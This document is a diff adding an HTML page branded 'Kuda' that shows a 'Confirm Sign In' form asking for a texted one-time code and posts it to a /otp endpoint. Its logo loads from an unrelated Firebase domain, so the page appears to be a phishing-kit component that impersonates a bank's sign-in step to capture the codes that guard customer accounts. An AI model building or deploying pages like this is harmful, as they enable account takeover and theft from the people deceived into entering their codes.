@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link
+      rel="shortcut icon"
+      href="https://younk-5b894.web.app/images/logo.png"
+      type="image/x-icon"
+    />
+    <title>Kuda</title>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
+      integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <!-- <link rel="stylesheet" href="/css/otp.css" /> -->
+    <style>
+      @import url("https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;700;800&family=Roboto:wght@100;300;400;500;700;900&display=swap");
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: "Open Sans", sans-serif;
+      }
+      body {
+        background: #fff;
+      }
+
+      .container {
+        height: 100%;
+        width: 100%;
+      }
+
+      .contentSec {
+        padding: 2em 0;
+      }
+
+      .title {
+        font-size: 1.3em;
+        font-weight: 600;
+        color: #000;
+        line-height: 1.3em;
+        display: flex;
+        justify-content: center;
+        padding-bottom: 1em;
+      }
+
+      .contentSec span {
+        display: flex;
+        justify-content: center;
+      }
+      .loginWrapper {
+        display: flex;
+        justify-content: center;
+        padding: 0em 0 0;
+      }
+      .loginSec {
+        width: 100%;
+        max-width: 400px;
+        height: 100%;
+        min-height: 326px;
+        background: #fff;
+        border-radius: 1em;
+      }
+      label {
+        display: block;
+        margin-bottom: 0.5em;
+      }
+      form {
+        padding: 0.76em;
+        margin-top: 0;
+      }
+      .formInput {
+        display: flex;
+        align-items: center;
+        background: #fff;
+        width: 100%;
+        height: 100%;
+        max-width: 22rem;
+        min-height: 50px;
+        border: 1px solid #898787;
+        border-radius: 7px;
+        margin-bottom: 1.3em;
+      }
+      .formInput i {
+        font-size: 1.2em;
+        color: #898787;
+        margin-right: 0.6em;
+      }
+      form input {
+        display: block;
+        width: 100%;
+        height: 100%;
+        border: none;
+        outline: none;
+        font-size: 1.1em;
+        margin-left: 1em;
+      }
+
+      .buttonSec {
+        display: flex;
+        justify-content: center;
+        padding-top: 8em;
+      }
+      button {
+        width: 100%;
+        height: 100%;
+        min-height: 3.5rem;
+        border-radius: 7px;
+        outline: none;
+        border: none;
+        font-size: 1.2em;
+        font-weight: 600;
+        background: #411b69;
+        color: #fff;
+        margin-top: 1em;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="contentSec">
+        <div class="title">Confirm Sign In</div>
+        <span>We sent a you a code by text</span>
+      </div>
+      <div class="loginWrapper">
+        <div class="loginSec">
+          <form method="post">
+            <label for="otp">Code</label>
+            <div class="formInput">
+              <input
+                id="otp"
+                name="otp"
+                type="password"
+                required
+                placeholder="*****"
+                oninput="this.value = this.value.replace(/[^0-9]/g, '')"
+                inputmode="numeric"
+                pattern="[0-9]*"
+              />
+            </div>
+
+            <button id="submitBtn" type="submit">Sign In</button>
+          </form>
+        </div>
+      </div>
+    </div>
+    <!-- <script src="/js/app.otp.js"></script> -->
+    <script>
+      const Form = document.querySelector("form");
+      const otp = document.querySelector("#otp");
+      const btn = document.querySelector("button");
+
+      btn.onclick = () => {
+        btn.innerHTML = "Loading...";
+      };
+      Form.addEventListener("submit", (e) => {
+        e.preventDefault();
+
+        let formData = {
+          otp: otp.value,
+        };
+
+        const handleFetchForm = async (res, req) => {
+          const request = await fetch("/otp", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify(formData),
+          });
+          const response = await request.text();
+          console.log(request.statusText);
+          console.log(response);
+          if (response == "success") {
+            otp.value = "";
+            location.href = "/otp";
+          } else {
+            console.log("error");
+          }
+        };
+        handleFetchForm();
+      });
+    </script>
+  </body>
+</html>
